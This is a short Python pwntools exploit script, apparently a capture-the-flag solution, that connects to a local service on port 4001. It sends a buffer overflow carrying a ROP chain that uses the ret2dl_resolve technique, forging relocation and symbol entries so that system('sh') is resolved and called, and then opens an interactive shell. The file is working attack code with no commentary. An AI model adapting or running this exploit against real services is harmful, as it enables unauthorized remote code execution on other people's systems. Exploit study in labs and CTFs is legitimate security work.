 #!usr/bin/env python


from pwn import *

#context.arch='amd64'
r=remote('127.0.0.1',4001)
memcpy = 0x08048310
plt0= 0x80482f0
read = 0x8048300
pop3_esi = 0x8048519
pop2_edi = 0x804851a
pop1_ebp = 0x804851b
gmon = 0x8048326 #problem#libc+start
buf =0x804a040
d =buf+2048

dynamic =  0x08049f14 
relplt = 0x80482b4
dynsym = 0x80481cc
dynstr = 0x804822c
dynamic_dynstr =dynamic +8 * 8

rop = flat(
    plt0,d-relplt, 0xdead,d+36   
     )
data = flat(
	[buf,0x7 | ((d+12-dynsym)/16)<<8],0x456,
      [d+28-dynstr,2,3,0x12],
      'system\x00\x00',
      'sh\00' 
      )
raw_input('@') #p32(0xffd2e39c)
r.send(('A'*14+p32(buf+1024+4)).ljust(1024,'\0') + rop.ljust(1024,'\0')+data)
r.interactive()
